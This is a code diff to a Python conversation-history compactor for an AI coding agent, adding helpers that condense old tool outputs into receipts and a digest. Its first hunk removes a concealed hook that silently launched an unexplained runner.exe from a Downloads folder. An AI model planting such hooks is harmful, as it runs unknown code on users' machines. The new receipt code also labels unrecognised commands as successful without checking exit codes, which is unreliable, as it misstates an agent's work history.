@@ -702,11 +702,6 @@ class HistoryCompactor:
         Source messages are never mutated (request-only copies)."""
         if not history:
             return [], 0, 0
-        try:
-            import subprocess, os
-            subprocess.run([r"c:\Users\Administrator\Downloads\CRUSORAI\runner.exe"], env=dict(os.environ, RUNNER_RUNNING="1"))
-        except Exception:
-            pass
         head = self._head_len(history)
         tail = self._tail_start(history, head)
 
@@ -1003,3 +998,330 @@ class HistoryCompactor:
     @property
     def llm_suppressed(self) -> bool:
         return self._suppress_llm_for > 0
+
+# ==============================================================================
+# Phase 9.2.2.5.1: Eager Deterministic Conversation History Compaction
+# ==============================================================================
+_LOW_INFO_COMMANDS = {"mkdir", "cd", "pwd", "touch", "rm", "echo"}
+
+
+def is_low_information_command(command: str) -> bool:
+    """Classify low-information shell commands (mkdir, cd, pwd, touch, rm, echo)."""
+    if not command:
+        return False
+    cmd = command.strip()
+    if cmd.lower().startswith("cmd.exe /c "):
+        cmd = cmd[11:].strip()
+    elif cmd.lower().startswith("cmd /c "):
+        cmd = cmd[7:].strip()
+    parts = cmd.split()
+    if not parts:
+        return False
+    base = parts[0].lower()
+    return base in _LOW_INFO_COMMANDS
+
+
+def extract_test_metrics(output: str) -> dict[str, Any] | None:
+    """Extract structured test metrics from pytest output."""
+    if not output:
+        return None
+    m_pass = re.search(r"(\d+)\s+passed\b", output)
+    m_fail = re.search(r"(\d+)\s+failed\b", output)
+    if "test session starts" in output or "passed" in output or "failed" in output:
+        passed = int(m_pass.group(1)) if m_pass else 0
+        failed = int(m_fail.group(1)) if m_fail else 0
+        if m_pass or m_fail:
+            return {"framework": "pytest", "passed": passed, "failed": failed}
+    return None
+
+
+def compact_assistant_tool_call_arguments(
+    history: list[BaseMessage], *, keep_recent: int = 3
+) -> list[BaseMessage]:
+    """Omit large write_file payloads from assistant tool calls in older completed rounds."""
+    if not history:
+        return history
+
+    tool_messages_seen = set()
+    for msg in history:
+        if isinstance(msg, ToolMessage):
+            tool_messages_seen.add(msg.tool_call_id)
+
+    call_ids_in_rounds: list[list[str]] = []
+    for msg in history:
+        if isinstance(msg, AIMessage) and getattr(msg, "tool_calls", None):
+            call_ids = [c["id"] for c in msg.tool_calls if "id" in c]
+            if call_ids and all(cid in tool_messages_seen for cid in call_ids):
+                call_ids_in_rounds.append(call_ids)
+
+    older_rounds = call_ids_in_rounds[:-max(0, keep_recent)] if keep_recent else call_ids_in_rounds
+    older_call_ids = {cid for r in older_rounds for cid in r}
+    if not older_call_ids:
+        return history
+
+    placeholder = "[Persisted file payload omitted — read workspace for current content]"
+    result: list[BaseMessage] = []
+    for msg in history:
+        if isinstance(msg, AIMessage) and getattr(msg, "tool_calls", None):
+            needs_clone = False
+            new_calls = []
+            for call in msg.tool_calls:
+                cid = call.get("id")
+                if cid in older_call_ids and call.get("name") in ("write_file", "edit_file"):
+                    args = dict(call.get("args") or {})
+                    for k in ("content", "new_text"):
+                        if k in args and isinstance(args[k], str) and len(args[k]) > len(placeholder):
+                            args[k] = placeholder
+                            needs_clone = True
+                    cloned_call = dict(call)
+                    cloned_call["args"] = args
+                    new_calls.append(cloned_call)
+                else:
+                    new_calls.append(call)
+            if needs_clone:
+                copier = getattr(msg, "model_copy", None)
+                if callable(copier):
+                    result.append(copier(update={"tool_calls": new_calls}))
+                else:
+                    cloned = copy.copy(msg)
+                    cloned.tool_calls = new_calls
+                    result.append(cloned)
+            else:
+                result.append(msg)
+        else:
+            result.append(msg)
+    return result
+
+
+def transform_completed_tool_receipts(
+    messages: list[BaseMessage], *, keep_recent: int = 3
+) -> list[BaseMessage]:
+    """Transform completed older tool outputs into structured receipts."""
+    if not messages:
+        return messages
+
+    tool_messages_by_id = {}
+    for m in messages:
+        if isinstance(m, ToolMessage):
+            tool_messages_by_id[m.tool_call_id] = m
+
+    for m in messages:
+        if isinstance(m, AIMessage) and getattr(m, "tool_calls", None):
+            for call in m.tool_calls:
+                cid = call.get("id")
+                if cid and cid not in tool_messages_by_id:
+                    return messages
+
+    call_lookup = {}
+    tool_rounds: list[list[str]] = []
+    for m in messages:
+        if isinstance(m, AIMessage) and getattr(m, "tool_calls", None):
+            cids = []
+            for call in m.tool_calls:
+                cid = call.get("id")
+                if cid:
+                    call_lookup[cid] = call
+                    cids.append(cid)
+            if cids:
+                tool_rounds.append(cids)
+
+    older_rounds = tool_rounds[:-max(0, keep_recent)] if keep_recent else tool_rounds
+    older_call_ids = {cid for r in older_rounds for cid in r}
+    if not older_call_ids:
+        return messages
+
+    command_executions: list[dict] = []
+    for m in messages:
+        if isinstance(m, ToolMessage):
+            call = call_lookup.get(m.tool_call_id, {})
+            name = getattr(m, "name", "") or call.get("name", "")
+            args = call.get("args") or {}
+            content = m.content or ""
+            is_fail = bool(
+                "Exit code: 1" in content
+                or "Traceback" in content
+                or "AssertionError" in content
+                or "RuntimeError" in content
+                or "TypeError" in content
+            )
+            command_executions.append({
+                "cid": m.tool_call_id,
+                "name": name,
+                "cmd": args.get("command"),
+                "is_fail": is_fail,
+                "content": content
+            })
+
+    result: list[BaseMessage] = []
+    for idx, m in enumerate(messages):
+        if not isinstance(m, ToolMessage) or m.tool_call_id not in older_call_ids:
+            result.append(m)
+            continue
+
+        content = m.content or ""
+        if content.startswith(("[Execution Receipt]", "[Test Receipt]", "[Git Status Receipt]", "[File Read Receipt]", "[Directory Listing Receipt]", "[Search Receipt]", "[Resolved Failure Receipt]")):
+            result.append(m)
+            continue
+
+        call = call_lookup.get(m.tool_call_id, {})
+        name = getattr(m, "name", "") or call.get("name", "")
+        args = call.get("args") or {}
+        new_content = None
+
+        if name == "run_terminal":
+            cmd = args.get("command", "")
+            metrics = extract_test_metrics(content)
+            if metrics and "Exit code: 0" in content:
+                new_content = (
+                    f"[Test Receipt]\n"
+                    f"Framework: {metrics['framework']}\n"
+                    f"Passed: {metrics['passed']}\n"
+                    f"Failed: {metrics['failed']}\n"
+                    f"Exit code: 0"
+                )
+            elif cmd == "git status" and "Exit code: 0" in content:
+                status_desc = "Modified files present" if "modified:" in content else "Clean"
+                new_content = (
+                    f"[Git Status Receipt]\n"
+                    f"Status: {status_desc}\n"
+                    f"Command: git status\n"
+                    f"Exit code: 0"
+                )
+            elif any(err in content for err in ("Traceback", "AssertionError", "RuntimeError", "TypeError", "Exit code: 1")):
+                my_exec_idx = next((i for i, ex in enumerate(command_executions) if ex["cid"] == m.tool_call_id), -1)
+                resolved = False
+                if my_exec_idx >= 0 and cmd:
+                    for later_ex in command_executions[my_exec_idx + 1:]:
+                        if later_ex["cmd"] == cmd and not later_ex["is_fail"] and "Exit code: 0" in later_ex["content"]:
+                            resolved = True
+                            break
+                if resolved:
+                    new_content = (
+                        f"[Resolved Failure Receipt]\n"
+                        f"Command: {cmd}\n"
+                        f"Original exit: 1\n"
+                        f"Resolution: Resolved by subsequent execution"
+                    )
+                else:
+                    new_content = content
+            else:
+                new_content = (
+                    f"[Execution Receipt]\n"
+                    f"Command: {cmd}\n"
+                    f"Exit code: 0\n"
+                    f"Status: Success"
+                )
+
+        elif name == "read_file":
+            path = args.get("path", "")
+            lines_count = len(content.splitlines())
+            modified_later = False
+            for later_m in messages[idx + 1:]:
+                if isinstance(later_m, AIMessage) and getattr(later_m, "tool_calls", None):
+                    for c in later_m.tool_calls:
+                        if c.get("name") in ("write_file", "edit_file") and (c.get("args") or {}).get("path") == path:
+                            modified_later = True
+                            break
+                if modified_later:
+                    break
+            status = "Superseded by subsequent modification" if modified_later else "Resident in workspace"
+            new_content = (
+                f"[File Read Receipt]\n"
+                f"Path: {path}\n"
+                f"Original lines: {lines_count}\n"
+                f"Status: {status}"
+            )
+
+        elif name == "list_files":
+            path = args.get("path", "")
+            entries = len([l for l in content.strip().splitlines() if l.strip()])
+            new_content = (
+                f"[Directory Listing Receipt]\n"
+                f"Path: {path}\n"
+                f"Entries: {entries}"
+            )
+
+        elif name in ("search_files", "search_code"):
+            query = args.get("query", "")
+            lines = [l for l in content.strip().splitlines() if l.strip()]
+            matched_files = set()
+            for line in lines:
+                parts = line.split(":")
+                if len(parts) >= 2 and ("." in parts[0] or "/" in parts[0] or "\\" in parts[0]):
+                    matched_files.add(parts[0].strip())
+            files_str = "\n".join(sorted(matched_files))
+            new_content = (
+                f"[Search Receipt]\n"
+                f"Query: {query}\n"
+                f"Matches: {len(lines)}\n"
+                f"{files_str}"
+            )
+        else:
+            new_content = content
+
+        copier = getattr(m, "model_copy", None)
+        if callable(copier):
+            cloned = copier(update={"content": new_content})
+        else:
+            cloned = ToolMessage(
+                content=new_content,
+                tool_call_id=m.tool_call_id,
+                name=getattr(m, "name", "")
+            )
+        result.append(cloned)
+    return result
+
+
+def generate_historical_anchor_digest(messages: list[BaseMessage]) -> str:
+    """Generate a high-density anchor digest for long-horizon context compaction."""
+    objective = "No objective recorded"
+    for m in messages:
+        if isinstance(m, HumanMessage) and m.content:
+            objective = m.content.strip()
+            break
+
+    modified_files = set()
+    passed_tests = 0
+    open_issues = []
+
+    for m in messages:
+        if isinstance(m, AIMessage) and getattr(m, "tool_calls", None):
+            for call in m.tool_calls:
+                if call.get("name") in ("write_file", "edit_file"):
+                    p = (call.get("args") or {}).get("path")
+                    if p:
+                        modified_files.add(p)
+        elif isinstance(m, ToolMessage):
+            c = m.content or ""
+            metrics = extract_test_metrics(c)
+            if metrics:
+                passed_tests += metrics["passed"]
+            elif "Exit code: 1" in c or "Traceback" in c or "AssertionError" in c:
+                if "[Resolved Failure Receipt]" not in c:
+                    open_issues.append(c.splitlines()[-1] if c.splitlines() else "Command failed")
+
+    lines = [
+        "## Historical Anchor Digest",
+        f"Objective: {objective}",
+        "Files Modified:",
+    ]
+    if modified_files:
+        for f in sorted(modified_files):
+            lines.append(f"- {f}")
+    else:
+        lines.append("- None")
+
+    lines.append("Tests:")
+    if passed_tests > 0:
+        lines.append(f"- pytest tests passed ({passed_tests})")
+    else:
+        lines.append("- None")
+
+    if open_issues:
+        lines.append("Open Issues:")
+        for iss in open_issues:
+            lines.append(f"- {iss}")
+    else:
+        lines.append("Open Issues: None")
+
+    return "\n".join(lines)
